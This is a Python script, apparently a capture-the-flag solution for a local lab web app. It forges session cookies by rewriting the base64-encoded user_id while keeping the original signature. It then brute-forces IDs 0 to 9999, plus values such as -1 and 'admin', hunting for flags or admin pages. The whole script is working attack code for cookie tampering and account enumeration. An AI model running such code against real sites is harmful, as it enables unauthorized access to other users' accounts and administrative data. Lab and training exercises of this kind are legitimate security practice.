import requests
import base64
import json
import re

target_url = "http://127.0.0.1:33198/"
original_session = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"

parts = original_session.split('.')
original_payload = base64.urlsafe_b64decode(parts[0] + '==')
original_data = json.loads(original_payload)

print("EXHAUSTIVE USER ID SEARCH")
print("="*60)
print(f"Vulnerable to session manipulation - testing all user IDs\n")

# Test all user IDs from 0 to 9999 - exhaustive search
print("Testing user IDs 0-9999...")
found_flags = []

for user_id in range(0, 10000):
    if user_id % 1000 == 0:
        print(f"  Progress: user_id={user_id}")
    
    # Create modified session
    modified = original_data.copy()
    modified['user_id'] = user_id
    
    modified_json = json.dumps(modified, separators=(',', ':'))
    modified_payload = base64.urlsafe_b64encode(modified_json.encode()).decode().rstrip('=')
    modified_session = f"{modified_payload}.{parts[1]}.{parts[2]}"
    
    # Test session
    resp = requests.get(target_url, cookies={'session': modified_session}, 
                       allow_redirects=False, timeout=10)
    
    if resp.status_code == 200:
        # Check for flag in response
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            flag_value = flag_match.group(0)
            print(f"\n[!] FOUND FLAG at user_id={user_id}")
            print(f"[!] FLAG: {flag_value}")
            print(f"\nFull response:\n{resp.text[:500]}")
            found_flags.append({'user_id': user_id, 'flag': flag_value})
            break  # Stop after finding first flag
        
        # Check for admin indicators
        if 'admin' in resp.text.lower():
            print(f"\n[!] Admin content at user_id={user_id}")
            print(f"{resp.text[:200]}")

if not found_flags:
    print("\n[-] No flags found in range 0-9999")
    
    # Try negative user IDs and other edge cases
    print("\n[+] Testing edge cases...")
    edge_cases = [-1, 'admin', 'true', 'null', '"admin"']
    
    for case in edge_cases:
        try:
            modified = original_data.copy()
            modified['user_id'] = case
            
            modified_json = json.dumps(modified, separators=(',', ':'))
            modified_payload = base64.urlsafe_b64encode(modified_json.encode()).decode().rstrip('=')
            modified_session = f"{modified_payload}.{parts[1]}.{parts[2]}"
            
            resp = requests.get(target_url, cookies={'session': modified_session}, 
                               allow_redirects=False, timeout=10)
            
            if resp.status_code == 200:
                print(f"  Case {case}: Status 200")
                if 'FLAG{' in resp.text:
                    flag = re.search(r'FLAG\{[^}]+\}', resp.text)
                    if flag:
                        print(f"  [!] FLAG: {flag.group(0)}")
                        found_flags.append({'user_id': case, 'flag': flag.group(0)})
        except Exception as e:
            print(f"  Case {case}: Error {e}")

print("\n" + "="*60)
if found_flags:
    print("FLAGS FOUND:")
    for f in found_flags:
        print(f"  User ID {f['user_id']}: {f['flag']}")
else:
    print("[-] No flags found in exhaustive search")
    print("[!] May need to test additional endpoints or session fields")
